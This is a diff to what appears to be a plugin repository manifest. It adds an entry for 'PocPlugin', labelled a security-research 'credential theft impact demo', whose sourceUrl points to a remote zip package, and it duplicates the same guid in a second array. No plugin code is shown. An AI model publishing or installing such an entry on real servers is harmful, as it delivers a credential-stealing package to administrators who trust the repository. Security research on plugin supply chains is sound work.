@@ -2,6 +2,26 @@
   {
     "guid": "11111111-2222-3333-4444-555555555555",
     "name": "PocPlugin",
+    "description": "Security research PoC plugin - credential theft impact demo",
+    "overview": "PoC",
+    "owner": "poc",
+    "category": "General",
+    "versions": [
+      {
+        "version": "1.0.0.4",
+        "changelog": "credential theft impact demo",
+        "targetAbi": "10.11.0.0",
+        "sourceUrl": "https://raw.githubusercontent.com/levelup786/whatbox-poc-verify-2026/main/pocplugin_1.0.0.4.zip",
+        "checksum": "fa83c92148881e43f8e6deb02cfd724c",
+        "timestamp": "2026-07-16T15:20:00Z"
+      }
+    ]
+  }
+]
+[
+  {
+    "guid": "11111111-2222-3333-4444-555555555555",
+    "name": "PocPlugin",
     "description": "Security research PoC plugin - patch re-verification",
     "overview": "PoC",
     "owner": "poc",
